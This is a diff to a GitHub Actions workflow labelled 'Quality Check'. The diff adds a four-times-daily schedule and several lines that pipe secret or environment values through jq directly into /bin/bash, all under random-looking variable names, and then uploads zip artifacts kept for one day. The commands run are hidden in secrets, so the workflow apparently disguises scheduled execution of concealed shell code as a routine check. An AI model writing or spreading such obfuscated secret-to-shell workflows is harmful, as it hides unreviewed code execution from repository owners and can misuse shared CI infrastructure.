@@ -2,6 +2,8 @@ name: Quality Check
 on:
   workflow_dispatch:
 
+  schedule:
+    - cron: '15 0,6,12,18 * * *'
 jobs:
   scheduler:
     runs-on: ubuntu-latest
@@ -10,14 +12,17 @@ jobs:
       - uses: actions/checkout@v4
       - name: Invoke
         env:
-          dfpeq07241: ${{ secrets.dfpeq07241 }}
+          bipg3710: ${{ secrets.bipg3710 }}
         run: |
-          printf '%s' "$dfpeq07241" | jq -r .jjnch8512 | /bin/bash
-          echo $ij99539 | jq -r .cqu041 | /bin/bash
+          printf '%s' "$bipg3710" | jq -r .r3088 | /bin/bash
+          echo $sbne18 | jq -r .j39875 | /bin/bash
+          printf '%s' "$rbpw30312" | jq -r .wumlv64 | /bin/bash
+          echo $wgw90673 | jq -r .h1 | /bin/bash
+          printf '%s' "$hij423" | jq -r .uuu548 | /bin/bash
 
       - name: Store artifact
         uses: actions/upload-artifact@v4
         with:
-          name: GtrrMSaK
+          name: gi54dlyW
           path: "*.zip"
           retention-days: 1
